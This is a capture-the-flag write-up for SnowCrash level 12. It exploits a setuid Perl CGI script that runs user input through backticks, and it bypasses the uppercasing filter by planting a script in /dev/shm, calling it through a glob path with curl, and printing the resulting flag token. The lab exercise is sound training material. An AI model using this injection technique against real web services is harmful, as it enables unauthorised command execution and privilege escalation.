# Level 12

## Vulnerability
Priviledge escalation via CGI code injection

## Context
```
level12@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x+ 1 flag12 level12 464 Mar  5  2016 level12.pl
```
## Solution
Let's ```cat``` the file and see what we find. 
```
level12@SnowCrash:~$ cat level12.pl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));
```
This program uses CGI (Common Gateway Interface) to execute a shellscript.<br/>
Here's what that would look like in a navigator:<br/>
```http://${VM_IP}:4646/?x={shellscript}<br/>```

In the program, the shellscript is evaluated in the $xx variable... which we can exploit!<br/>
The regex will capitalize the $xx argument, so we if we write ```x="getflag > /dev/shm/flag12"``` it will be changed to ```"GETFLAG > /DEV/SHM/FLAG12"```.<br/>
Linux is case-sensitive, so it will fail to recognize a filepath in capital case. <br/>
Let's try writing our script to a file. 
```
level12@SnowCrash:~$ echo "getflag > /dev/shm/flag12" > /dev/shm/EXPLOIT
level12@SnowCrash:~$ cat /dev/shm/EXPLOIT
getflag > /dev/shm/flag12
```
Let's make sure we can run the script. 
```
level12@SnowCrash:~$ cd /dev/shm
level12@SnowCrash:/dev/shm$ `EXPLOIT`
EXPLOIT: command not found

level12@SnowCrash:/dev/shm$ `/dev/shm/EXPLOIT`
bash: /dev/shm/EXPLOIT: Permission denied
```
Ok, looks like it's not executable. Let's change the permissions on the file. 
```
level12@SnowCrash:/dev/shm$ chmod 755 EXPLOIT
level12@SnowCrash:/dev/shm$ `/dev/shm/EXPLOIT`
level12@SnowCrash:/dev/shm$ ls
EXPLOIT  flag12
level12@SnowCrash:/dev/shm$ cat flag12
Check flag.Here is your token :
Nope there is no token here for you sorry. Try again :)
```
It works! Time to leverage the perl program to execute our script. 
Since we can't pass the filepath directly (it'll get capitalized by the perl program and be unrecognizable), we'll use globbing and replace the file path with asterisks.
```
level12@SnowCrash:/dev/shm$ curl '127.0.0.1:4646?x="`/*/*/EXPLOIT`"'
..
level12@SnowCrash:/dev/shm$ cat flag12
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr
```
Success!
